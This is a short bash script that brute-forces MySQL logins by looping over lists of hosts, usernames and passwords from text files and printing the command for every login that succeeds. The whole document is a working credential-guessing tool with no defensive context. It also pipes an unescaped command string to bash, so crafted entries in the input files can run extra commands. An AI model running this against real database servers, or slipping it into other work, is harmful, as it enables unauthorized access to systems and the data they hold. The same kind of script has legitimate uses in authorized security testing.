#!/bin/bash

# Hosts must be in ip:port or fqdn:port format
HOSTS="$(cat hosts.txt | tr '\n' ',')"
USERS="$(cat users.txt | tr '\n' ',')"
PASSWORDS="$(cat passwords.txt | tr '\n' ',')"
IFS=","

for i in $HOSTS;
do
	for j in $USERS;
	do
		for k in $PASSWORDS
		do
			CMD="mysql -h '$(echo $i | awk -F ':' '{print $1}')' --port $(echo $i | awk -F ':' '{print $2}') -u '$j' --password='$k'"
			echo $CMD | bash > /dev/null 2>&1 && echo $CMD
		done
	done
done
